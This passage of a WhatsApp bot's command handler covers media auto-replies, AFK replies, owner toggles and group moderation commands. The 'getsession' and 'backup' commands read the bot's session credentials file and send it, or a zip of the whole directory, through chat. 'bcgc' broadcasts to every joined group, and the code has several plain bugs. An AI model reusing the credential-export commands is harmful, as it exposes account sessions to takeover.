            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcxeon(`𝑵𝒐 𝒏𝒐🤧 𝒅𝒐𝒏'𝒕 𝒕𝒂𝒈 𝒎𝒚 𝒎𝒂𝒏 𝒉𝒆'𝒔 𝒂𝒇𝒌😍\n\n*𝐑𝐞𝐚𝐬𝐨𝐧 :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} 𝒂𝒉𝒉 𝒉𝒆 𝒉𝒂𝒔 𝒓𝒆𝒕𝒖𝒓𝒏 𝒇𝒓𝒐𝒎𝒂𝒇𝒌🥲`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 2)
                    return replygcxeon(`𝑼𝒔𝒆 :\n*#addprem* @tag 𝒕𝒊𝒎𝒆\n*#addprem* 𝒏𝒖𝒎𝒃𝒆𝒓 𝒕𝒊𝒎𝒆\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : #addprem @tag 30𝐝`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcxeon("😍𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑺𝒖𝒄𝒄𝒆𝒔 𝒃𝒂𝒃𝒚💘")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcxeon("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑼𝒔𝒆 :\n*#delprem* @tag\n*#delprem* 𝒏𝒖𝒎𝒃𝒆𝒓`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcxeon("𝑫𝒆𝒍𝒆𝒕𝒆 𝑺𝒖𝒄𝒄𝒆𝒔 𝒅𝒂𝒓𝒍𝒊𝒏𝒈🍭")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcxeon("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcxeon(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 」------*\n\n`
                for (let i of data) {
                    txt += `𝐍𝐮𝐦𝐛𝐞𝐫 : ${i.id}\n`
                    txt += `𝐄𝐱𝐩𝐢𝐫𝐞𝐝 : ${i.expired} 𝐒𝐞𝐜𝐨𝐧𝐝\n`         
                }                
                XeonBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcxeon(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcxeon('𝑩𝒂𝒃𝒆 𝒖𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒔𝒄𝒂𝒏 𝒅𝒊𝒓𝒆𝒄𝒕𝒐𝒓𝒚: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcxeon(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcxeon(teks)
                    await sleep(2000)
                    replygcxeon("𝑺𝒉𝒖𝒏𝒂 𝒅𝒆𝒍𝒆𝒕𝒆 𝒋𝒖𝒏𝒌 𝒇𝒊𝒍𝒆.....🫣")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcxeon("𝑫𝒂𝒓𝒍𝒊𝒏𝒈 𝑺𝒉𝒖𝒏𝒂 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒂𝒍𝒍 𝒕𝒓𝒂𝒔𝒉 𝒊𝒏 𝒔𝒆𝒔𝒔𝒊𝒐𝒏 𝒇𝒐𝒍𝒅𝒆𝒓😘")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replygcxeon(mess.owner)
                    if (!text) return replygcxeon('𝑩𝒂𝒃𝒆 𝒆𝒏𝒕𝒆𝒓 𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌!!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('𝑮𝒐𝒎𝒆𝒏 𝒍𝒊𝒏𝒌 𝒊𝒏𝒗𝒂𝒍𝒊𝒅!')
                    replygcxeon(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await XeonBotInc.groupAcceptInvite(result).then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                } catch {
                    replygcxeon('𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒋𝒐𝒊𝒏 𝒈𝒓𝒐𝒖𝒑 𝑮𝒐𝒎𝒆𝒏 𝒎𝒚 𝒉𝒆𝒂𝒓𝒕🤧')
                }
                break      
            case 'getsession':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕 𝒂 𝒎𝒐𝒎𝒆𝒏𝒕, 𝑺𝒉𝒖𝒏𝒂 𝒊𝒔 𝒄𝒖𝒓𝒓𝒆𝒏𝒕𝒍𝒚 𝒓𝒆𝒕𝒓𝒊𝒆𝒗𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒔𝒆𝒔𝒔𝒊𝒐𝒏 𝒇𝒊𝒍𝒆😌')
                let sesi = await fs.readFileSync('./session/creds.json')
                XeonBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon(`𝑩𝒚𝒆 𝒃𝒚𝒆 𝒔𝒘𝒆𝒆𝒕𝒚🤧👋`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('𝑰𝒏 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒃𝒂𝒃𝒆🫠....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑩𝒂𝒃𝒆 𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix + command} 𝒐𝒏/𝒐𝒇𝒇 😇`)
                if (q === '𝒐𝒏') {
                    autoread = true
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐𝒓𝒆𝒂𝒅 𝒕𝒐 ${q} 𝒎𝒚 𝒉𝒆𝒂𝒓𝒕☺️`)
                } else if (q === '𝒐𝒇𝒇') {
                    autoread = false
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐𝒓𝒆𝒂𝒅 𝒕𝒐 ${q} 𝒎𝒚 𝒉𝒆𝒂𝒓𝒕☺️`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑩𝒂𝒃𝒆 𝒆𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix + command} 𝒐𝒏/𝒐𝒇𝒇 😇`)
                if (q === '𝒐𝒏') {
                    autoTyping = true
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐-𝒕𝒚𝒑𝒊𝒏𝒈 𝒕𝒐 ${q} 𝒃𝒂𝒃𝒆🍭`)
                } else if (q === '𝒐𝒇𝒇') {
                    autoTyping = false
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐-𝒕𝒚𝒑𝒊𝒏𝒈 𝒕𝒐 ${q} 𝒃𝒂𝒃𝒆🍭`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑩𝒂𝒃𝒆 𝒆𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix + command} 𝒐𝒏/𝒐𝒇𝒇 😇`)
                if (q === '𝒐𝒏') {
                    autoRecording = true
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐-𝒓𝒆𝒄𝒐𝒓𝒅𝒊𝒏𝒈 𝒕𝒐 ${q} 𝑫𝒂𝒓𝒍𝒊𝒏𝒈❤️`)
                } else if (q === '𝒐𝒇𝒇') {
                    autoRecording = false
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐-𝒓𝒆𝒄𝒐𝒓𝒅𝒊𝒏𝒈 𝒕𝒐 ${q} 𝑫𝒂𝒓𝒍𝒊𝒏𝒈❤️`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑩𝒂𝒃𝒆 𝒆𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix + command} 𝒐𝒏/𝒐𝒇𝒇 😇`)
                if (q === '𝒐𝒏') {
                    autorecordtype = true
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐 𝒓𝒆𝒄𝒐𝒓𝒅𝒊𝒏𝒈 𝒂𝒏𝒅 𝒕𝒚𝒑𝒊𝒏𝒈 𝒕𝒐 ${q} 𝒃𝒂𝒃𝒚💞`)
                } else if (q === '𝒐𝒇𝒇') {
                    autorecordtype = false
                    replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒂𝒖𝒕𝒐 𝒓𝒆𝒄𝒐𝒓𝒅𝒊𝒏𝒈 𝒂𝒏𝒅 𝒕𝒚𝒑𝒊𝒏𝒈 𝒕𝒐 ${q} 𝒃𝒂𝒃𝒚💞`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replygcxeon(mess.owner)
               if (args.length < 1) return replygcxeon('𝒐𝒏/𝒐𝒇𝒇? 𝒎𝒚 𝒍𝒐𝒗𝒆')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcxeon(`${command} 𝒊𝒔 𝒆𝒏𝒂𝒃𝒍𝒆𝒅 𝒔𝒘𝒆𝒆𝒕𝒉𝒆𝒂𝒓𝒕🍭`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcxeon(`${command} 𝒊𝒔 𝒅𝒊𝒔𝒂𝒃𝒍𝒆𝒅 𝒔𝒘𝒆𝒆𝒕𝒉𝒆𝒂𝒓𝒕🍭`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑩𝒂𝒃𝒆 𝒆𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix + command} 𝒐𝒏/𝒐𝒇𝒇 😇`)
                if (q == '𝒐𝒏') {
                    autobio = true
                    replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝑨𝒖𝒕𝒐𝒃𝒊𝒐 𝒕𝒐 ${q}`)
                } else if (q == '𝒐𝒇𝒇') {
                    autobio = false
                    replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝑨𝒖𝒕𝒐𝒃𝒊𝒐 𝒕𝒐 ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`𝑩𝒂𝒃𝒆 𝒆𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix + command} 𝒑𝒖𝒃𝒍𝒊𝒄/𝒔𝒆𝒍𝒇 😇`)
                if (q == '𝒑𝒖𝒃𝒍𝒊𝒄') {
                    XeonBotInc.public = true
                    replygcxeon(mess.done)
                } else if (q == '𝒔𝒆𝒍𝒇') {
                    XeonBotInc.public = false
                    replygcxeon(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`𝑩𝒂𝒃𝒆 𝒆𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix + command} 𝒑𝒂𝒄𝒌𝒏𝒂𝒎𝒆|𝒂𝒖𝒕𝒉𝒐𝒓 ☺️`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝒆𝒙𝒊𝒇 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 𝒕𝒐\n\n• 𝑷𝒂𝒄𝒌𝒏𝒂𝒎𝒆 : ${global.packname}\n• 𝑨𝒖𝒕𝒉𝒐𝒓 : ${global.author}`)
                break
            case 'setpp':
            case 'shunapp':
            case 'setppbot':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!quoted) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝑰𝒎𝒂𝒈𝒆 𝑾𝒊𝒕𝒉 𝑪𝒂𝒑𝒕𝒊𝒐𝒏 𝒅𝒂𝒓𝒍𝒊𝒏𝒈❤️ ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝑰𝒎𝒂𝒈𝒆 𝑾𝒊𝒕𝒉 𝑪𝒂𝒑𝒕𝒊𝒐𝒏 𝒅𝒂𝒓𝒍𝒊𝒏𝒈❤️ ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝑰𝒎𝒂𝒈𝒆 𝑾𝒊𝒕𝒉 𝑪𝒂𝒑𝒕𝒊𝒐𝒏 𝒅𝒂𝒓𝒍𝒊𝒏𝒈❤️ ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.updateBlockStatus(blockw, 'block').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.updateBlockStatus(blockww, 'unblock').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('𝑩𝒚𝒆 𝒃𝒚𝒆 🥺')
                await XeonBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                if (m.isGroup) return replygcxeon(mess.private)
                replygcxeon(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await XeonBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`𝑾𝒉𝒊𝒄𝒉 𝒕𝒆𝒙𝒕?\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix + command} 𝒊𝒕'𝒔 𝒗𝒂𝒍𝒆𝒏𝒕𝒊𝒏𝒆 𝒕𝒐𝒎𝒐𝒓𝒓𝒐𝒘😍 `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝒔𝒆𝒏𝒅 𝒃𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕 𝒕𝒐 ${anu.length} 𝑮𝒓𝒐𝒖𝒑 𝒄𝒉𝒂𝒕, 𝑬𝒏𝒅 𝒕𝒊𝒎𝒆 ${anu.length * 1.5} 𝒔𝒆𝒄𝒐𝒏𝒅`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nsʜᴜɴᴀ ʙʀᴏᴀᴅᴄᴀsᴛ🙈'
                    XeonBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: '𝑩𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕 𝒃𝒚 𝑳𝒊𝒎𝒖𝒍𝒆 𝒎𝒚 𝒉𝒖𝒔𝒃𝒂𝒏𝒅😍',
                                body: `𝑺𝒆𝒏𝒕 ${i.length} 𝑮𝒓𝒐𝒖𝒑`,
                                thumbnailUrl: 'https://iili.io/dP0sxmg.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒔𝒆𝒏𝒕 𝒃𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕 𝒕𝒐 ${anu.length} 𝑮𝒓𝒐𝒖𝒑 𝒅𝒂𝒓𝒍𝒊𝒏𝒈🍭`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcxeon(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcxeon(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcxeon(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcxeon('𝑩𝒂𝒃𝒆 𝒕𝒉𝒆 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 𝒘𝒂𝒔 𝒏𝒐𝒕 𝒔𝒆𝒏𝒕 𝒃𝒚 𝒂 𝒃𝒐𝒕 𝒏𝒐𝒓 𝒔𝒉𝒖𝒏𝒂🤧!')
                XeonBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*𝑪𝒉𝒐𝒐𝒔𝒆:*\n𝒔𝒆𝒄𝒐𝒏𝒅\n𝒎𝒊𝒏𝒖𝒕𝒆\n𝒉𝒐𝒖𝒓\n𝒅𝒂𝒚\n\n*𝑬𝒙𝒂𝒎𝒑𝒍𝒆*\n10 𝒔𝒆𝒄𝒐𝒏𝒅🍭')
                }
                replygcxeon(`𝑪𝒍𝒐𝒔𝒆 𝒕𝒊𝒎𝒆 ${q} 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒇𝒓𝒐𝒎 𝒏𝒐𝒘😇💞
                > 𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝑳𝒊𝒎𝒖𝒍𝒆 𝑺𝒐𝒍𝒊𝒕𝒂𝒓𝒖𝒔`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*𝑪𝒍𝒐𝒔𝒆𝒅* 𝒈𝒓𝒐𝒖𝒑 𝒄𝒍𝒐𝒔𝒆𝒅 𝒃𝒚 𝒂𝒅𝒎𝒊𝒏\n𝒏𝒐𝒘 𝒐𝒏𝒍𝒚 𝒂𝒅𝒎𝒊𝒏 𝒄𝒂𝒏 𝒔𝒆𝒏𝒅 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔😝🤭`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('𝑪𝒉𝒐𝒐𝒔𝒆:*\n𝒔𝒆𝒄𝒐𝒏𝒅\n𝒎𝒊𝒏𝒖𝒕𝒆\n𝒉𝒐𝒖𝒓\n𝒅𝒂𝒚\n\n*𝑬𝒙𝒂𝒎𝒑𝒍𝒆*\n10 𝒔𝒆𝒄𝒐𝒏𝒅🍭')
                }
                replygcxeon(`𝑶𝒑𝒆𝒏 𝒕𝒊𝒎𝒆 ${q} 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒇𝒓𝒐𝒎 𝒏𝒐𝒘😇💞
                > 𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝑳𝒊𝒎𝒖𝒍𝒆 𝑺𝒐𝒍𝒊𝒕𝒂𝒓𝒖𝒔`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*𝑶𝒑𝒆𝒏𝒆𝒅* 𝒈𝒓𝒐𝒖𝒑 𝒐𝒑𝒆𝒏𝒆𝒅 𝒃𝒚 𝒂𝒅𝒎𝒊𝒏\n𝒏𝒐𝒘 𝒎𝒆𝒎𝒃𝒆𝒓𝒔 𝒄𝒂𝒏 𝒔𝒆𝒏𝒅 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔🤭`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
